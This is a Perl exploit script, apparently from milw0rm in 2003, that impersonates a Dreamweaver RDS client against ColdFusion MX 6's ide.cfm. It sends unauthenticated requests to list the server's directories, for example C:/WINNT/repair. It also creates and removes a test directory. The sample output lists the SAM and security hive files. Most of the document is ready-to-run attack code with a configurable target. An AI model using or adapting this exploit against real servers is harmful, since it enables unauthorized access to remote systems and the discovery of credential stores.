#!/usr/bin/perl
# RDS_c_Dump.pl
# By angry packet

## 
#     THIS IS AN UNPATCHED VULNERABILITY - THIS IS AN UNPATCHED VULNERABILITY
# 
# ColdFusion 6 MX Server does several things in order to get remote dir structure so we will need
# to recreate these functions. This is a "almost" complete emulation of a dreamweaver client connection,
# in like one full HTTP1/1 session witin netcat.
#
# I would like to point out that the ASPSESSID never validates so you can change this on the fly.
#
# Due to certian current situations I am not allowed to release full exploit code with 
# ( READ, RETRIEVE, WRITE ) functions.
#
# Sample output:
# --------------------------------
# Vic7im1@cipher:~/Scripts/RDS_Sploit$ perl RDS_c_Dump.pl
#
# POST /CFIDE/main/ide.cfm?CFSRV=IDE&ACTION=BrowseDir_Studio HTTP/1.1
#
# Request String Value: 3:STR:15:C:/WINNT/repairSTR:1:*STR:0:
# Content-Length: 37
# Please wait.. ..
# HTTP/1.1 100 Continue
# Server: Microsoft-IIS/5.0
# Date: Tue, 01 Jul 2003 10:30:43 GMT
#
# HTTP/1.1 200 OK
# Server: Microsoft-IIS/5.0
# Date: Tue, 01 Jul 2003 10:30:43 GMT
# Connection: close
# Content-Type: text/html
#
# 50:2:F:11:autoexec.nt1:63:4383:0,02:F:9:config.nt1:64:25773:0,02:F:7:default1:66:1187843:0,
# 02:F:10:ntuser.dat1:66:1187843:0,02:F:3:sam1:65:204803:0,
# 02:F:12:secsetup.inf1:66:5735303:0,02:F:8:security1:65:286723:0,
# 02:F:9:setup.log1:66:1551943:0,02:F:8:software1:67:65331203:0,02:F:6:system1:66:9748483:0,0
# Vic7im1@cipher:~/Scripts/RDS_Sploit$
# ----------------------------------


use strict;
use IO::Socket;

use vars qw($response @clength @rarray);

## Dreamweaver string requests to ide.cfm
## --------------------------------------
#1:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:    		Content-Length: 46
#2:  3:STR:7:C:/_mm/STR:1:*STR:0:		      		Content-Length: 28
#3:  3:STR:6:C:/_mmSTR:9:ExistenceSTR:0:STR:0:STR:0:   		Content-Length: 47
#4:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:    		Content-Length: 46
#5:  3:STR:10:C:/_notes/STR:1:*STR:0:		      		Content-Length: 32
#6:  5:STR:9:C:/_notesSTR:9:ExistenceSTR:0:STR:0:STR:0 		Content-Length: 50
#7:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:    		Content-Length: 46
#8:  5:STR:12:C:/XYIZNWSK/STR:6:CreateSTR:0:STR:0:STR:0: 	Content-Length: 51
#9:  3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46
#10: 3:STR:3:C:/STR:1:*STR:0:					Content-Length: 24
#11: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46
#12: 5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:	Content-Length: 53
#13: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46
#14: 5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:	Content-Length: 53
#15: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46
#16: 5:STR:11:C:/XYIZNWSKSTR:6:RemoveSTR:0:STR:0:DSTR:0:	Content-Length: 51
#17: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46
#18: 3:STR:8:C:/WINNTSTR:1:*STR*STR:0:				Content-Length: 29
#19: 3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:		Content-Length: 46
#20: 3:STR:15:C:/WINNT/repairSTR:1:*STR:0:			Content-Length: 37


# Static Content-Lenght: $string_val if you plan on leaving C:\WINNT\repair you will need to know
# the $string_val.
@clength = ( "Content-Length: 46",
	     "Content-Length: 28",
	     "Content-Length: 47",
	     "Content-Length: 46",
       	     #"Content-Length: 32",
	     #"Content-Length: 50",
	     "Content-Length: 46",
	     "Content-Length: 51",
	     "Content-Length: 46",
	     "Content-Length: 24",
	     "Content-Length: 46",
	     "Content-Length: 53",
	     "Content-Length: 46",
	     "Content-Length: 53",
	     "Content-Length: 46",
	     "Content-Length: 51",
	     "Content-Length: 46",
	     "Content-Length: 29",
	     "Content-Length: 46",
	     "Content-Length: 37"
	   );


@rarray = ( "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "3:STR:7:C:/_mm/STR:1:*STR:0:",
	    "3:STR:6:C:/_mmSTR:9:ExistenceSTR:0:STR:0:STR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    #"3:STR:10:C:/_notes/STR:1:*STR:0:",
	    #"5:STR:9:C:/_notesSTR:9:ExistenceSTR:0:STR:0:STR:0",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "5:STR:12:C:/XYIZNWSK/STR:6:CreateSTR:0:STR:0:STR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "3:STR:3:C:/STR:1:*STR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "5:STR:11:C:/XYIZNWSKSTR:9:ExistenceSTR:0:STR:0:STR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "5:STR:11:C:/XYIZNWSKSTR:6:RemoveSTR:0:STR:0:DSTR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "3:STR:8:C:/WINNTSTR:1:*STR*STR:0:",
	    "3:STR:14:ConfigurationsSTR:10:6, 0, 0, 0STR:0:",
	    "3:STR:15:C:/WINNT/repairSTR:1:*STR:0:"
	    );



system("clear");
# change target addy below.
my $TARGET = "192.168.0.100";
my $PORT = "80";
my $STRING = "C:/WINNT/repair";
my $POST = "POST /CFIDE/main/ide.cfm?CFSRV=IDE&ACTION=BrowseDir_Studio HTTP/1.1\r\n";


print "Generating Socket with Array Directory Values.\n";
my ( $i, $c);
for ( $i = 0; $i < @rarray; $i++  ) {
	for ( $c = 0; $c < @clength; $c++ ) {	
			if( $i == $c ) {
			&gen_sock($TARGET, $PORT, $rarray[$i], $clength[$c]);
		}
	}
}


sub gen_sock() {
	my $sock = new IO::Socket::INET(PeerAddr => $TARGET, 
					PeerPort => $PORT,
					Proto	 => 'tcp',
					);
	die "Socket Could not be established ! $!" unless $sock;
	print "Target: $TARGET:$PORT\n";
	print "$POST\n";
	print "Request String Value: $rarray[$i]\n";
	print "$clength[$c]\n";
	print "Please wait.. ..\n";
	print $sock "$POST";
	print $sock "Content-Type: application/x-ColdFusionIDE\r\n";
	print $sock "User-Agent: Dreamweaver-RDS-SCM1.00\r\n";
	print $sock "Host: $TARGET\r\n";
	print $sock "$clength[$c]\r\n";
	print $sock "Connection: Keep-Alive\r\n";
	print $sock "Cache-Control: no-cache\r\n";
	print $sock "Cookie: ASPSESSIONIDQQQQGLDK=LPIHIKCAECKACDGPJCOLOAOJ\r\n";
	print $sock "\r\n";
	print $sock "$rarray[$i]"; 
	
	# lets return and print data to term
	while($response = <$sock>) {
		chomp($response);
		print "$response\n";
	}
	close($sock);
}

# milw0rm.com [2003-07-07]
